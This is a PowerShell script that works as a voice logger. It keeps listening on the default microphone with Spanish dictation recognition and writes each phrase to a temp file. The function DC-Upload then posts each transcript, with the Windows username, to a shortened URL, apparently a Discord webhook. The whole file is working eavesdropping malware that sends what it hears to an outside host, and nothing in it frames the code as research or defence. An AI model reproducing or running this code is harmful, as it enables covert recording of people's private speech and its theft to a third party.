function DC-Upload {

	[CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$False)]
		[string]$text 
	)

	$dc = 'https://bit.ly/3R3FRc5'

	$Body = @{
	  'username' = $env:username
	  'content' = $text
	}

	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};
}



function voiceLogger {
    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $grammar.Language = 'es-ES'  # Set the language code for Spanish (Spain)
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()
    $recognizer.RecognizeWithAlternates = $false  # Disable recognition with alternates

    while ($true) {
        $result = $recognizer.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            $log = "$env:tmp/VoiceLog.txt"
            Out-File -Encoding UTF8 -FilePath $log -InputObject $results
            $text = Get-Content $log -Raw
            DC-Upload $text

            # Use a switch statement with the $results variable
            switch -regex ($results) {
                '\bnote\b' {Start-Process notepad}
                '\bexit\b' {break}
            }
        }
    }
    Clear-Content -Path $log
}

voiceLogger


voiceLogger
